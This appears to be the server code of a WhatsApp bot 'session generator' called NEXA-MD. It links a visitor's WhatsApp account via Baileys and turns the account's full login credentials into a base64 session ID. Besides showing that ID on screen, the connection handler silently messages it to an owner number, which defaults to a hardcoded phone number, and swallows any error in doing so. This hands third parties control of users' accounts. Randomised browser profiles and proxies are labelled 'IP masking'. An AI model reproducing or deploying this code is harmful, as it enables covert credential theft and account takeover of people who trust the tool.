// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//       NEXA-MD SESSION GENERATOR SERVER
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

const express = require('express');
const next = require('next');
const http = require('http');
const { Server } = require('socket.io');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    Browsers,
    delay,
    DisconnectReason,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const QRCode = require('qrcode');
const fs = require('fs-extra');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');

const dev = process.env.NODE_ENV !== 'production';
const app = next({ dev });
const handle = app.getRequestHandler();

// ── IP Masking / Proxy Setup ──────────────
function getAgent() {
    // Koyeb/Vercel platform-ൽ proxy env set ചെയ്യാം
    const proxy = process.env.HTTPS_PROXY || process.env.HTTP_PROXY || '';
    const socks = process.env.SOCKS_PROXY || '';

    if (socks) return new SocksProxyAgent(socks);
    if (proxy) return new HttpsProxyAgent(proxy);
    return undefined;
}

// ── Random Browser Profiles (IP masking) ──
const BROWSER_PROFILES = [
    Browsers.macOS('Safari'),
    Browsers.windows('Edge'),
    Browsers.macOS('Desktop'),
    Browsers.ubuntu('Chrome'),
    Browsers.macOS('Chrome'),
];

function getRandomBrowser() {
    return BROWSER_PROFILES[Math.floor(Math.random() * BROWSER_PROFILES.length)];
}

// ── Connection Manager ────────────────────
class ConnectionManager {
    constructor(socket, type, phone) {
        this.socket = socket;
        this.type = type;
        this.phone = phone;
        this.maxRetries = 5;
        this.retryCount = 0;
        this.conn = null;
        this.sessionDir = path.join(__dirname, 'sessions', socket.id);
        this.isDestroyed = false;
    }

    async start() {
        if (fs.existsSync(this.sessionDir)) fs.removeSync(this.sessionDir);
        fs.ensureDirSync(this.sessionDir);
        await this.connect();
    }

    async connect() {
        if (this.isDestroyed) return;

        const browser = getRandomBrowser();
        const agent = getAgent();

        const { state, saveCreds } = await useMultiFileAuthState(this.sessionDir);
        let { version } = await fetchLatestBaileysVersion();

        const socketConfig = {
            auth: state,
            logger: pino({ level: 'silent' }),
            browser,
            version,
            printQRInTerminal: false,
            syncFullHistory: false,
            markOnlineOnConnect: false,
            connectTimeoutMs: 60000,
        };

        // Agent ഉണ്ടെങ്കിൽ add ചെയ്യുന്നു (IP masking)
        if (agent) socketConfig.agent = agent;

        this.conn = makeWASocket(socketConfig);
        this.conn.ev.on("creds.update", saveCreds);
        this.setupEventHandlers();

        // Pair code mode
        if (this.type === 'pair' && this.phone) {
            setTimeout(async () => {
                if (this.isDestroyed) return;
                try {
                    const code = await this.conn.requestPairingCode(
                        this.phone.replace(/[^0-9]/g, '')
                    );
                    this.socket.emit('code', code);
                } catch (err) {
                    this.retryCount++;
                    if (this.retryCount < this.maxRetries) await this.connect();
                }
            }, 6000);
        }
    }

    setupEventHandlers() {
        this.conn.ev.on("connection.update", async (update) => {
            if (this.isDestroyed) return;
            const { connection, qr, lastDisconnect } = update;

            // QR emit to frontend
            if (qr && this.type === 'qr') {
                const qrBase64 = await QRCode.toDataURL(qr);
                this.socket.emit('qr', qrBase64);
            }

            if (connection === "open") {
                await delay(3000);

                try {
                    const sessionData = JSON.stringify(this.conn.authState.creds);
                    const sessionID = "NEXA-MD~" + Buffer.from(sessionData).toString('base64');

                    // ✅ Frontend-ലേക്ക് emit (screen-ൽ കാണിക്കാൻ)
                    this.socket.emit('session-id', sessionID);

                    // WhatsApp message (owner-ലേക്ക്)
                    const ownerJid = (process.env.OWNER_NUMBER || "916235508514") + "@s.whatsapp.net";
                    await this.conn.sendMessage(ownerJid, {
                        text: `*✅ NEXA-MD SESSION ID*\n\n\`\`\`${sessionID}\`\`\`\n\n_Generated at ${new Date().toLocaleString()}_`
                    });

                } catch (e) {
                    // Silent
                }

                setTimeout(() => this.cleanup(), 15000);
            }

            if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode !== DisconnectReason.loggedOut && this.retryCount < 3) {
                    this.retryCount++;
                    await this.connect();
                } else {
                    this.socket.emit('error', 'Connection failed. Please try again.');
                    this.cleanup();
                }
            }
        });
    }

    cleanup() {
        this.isDestroyed = true;
        try { if (this.conn) this.conn.end(); } catch {}
        setTimeout(() => {
            try { if (fs.existsSync(this.sessionDir)) fs.removeSync(this.sessionDir); } catch {}
        }, 5000);
    }
}

// ── Start Server ──────────────────────────
app.prepare().then(() => {
    const server = express();
    const httpServer = http.createServer(server);
    const io = new Server(httpServer, {
        cors: { origin: "*" },
        transports: ['websocket', 'polling'],
    });

    const activeSessions = new Map();

    io.on('connection', (socket) => {
        console.log('New connection:', socket.id);

        socket.on('start-session', async (data) => {
            // Cleanup existing session
            if (activeSessions.has(socket.id)) {
                activeSessions.get(socket.id).cleanup();
            }

            const manager = new ConnectionManager(socket, data.type, data.phone);
            activeSessions.set(socket.id, manager);

            try {
                await manager.start();
            } catch (err) {
                socket.emit('error', 'Failed to start session.');
            }
        });

        socket.on('disconnect', () => {
            if (activeSessions.has(socket.id)) {
                activeSessions.get(socket.id).cleanup();
                activeSessions.delete(socket.id);
            }
        });
    });

    server.all('*', (req, res) => handle(req, res));

    const PORT = process.env.PORT || 3000;
    httpServer.listen(PORT, "0.0.0.0", () => {
        console.log(`✅ NEXA-MD Session Server running on port ${PORT}`);
    });
});
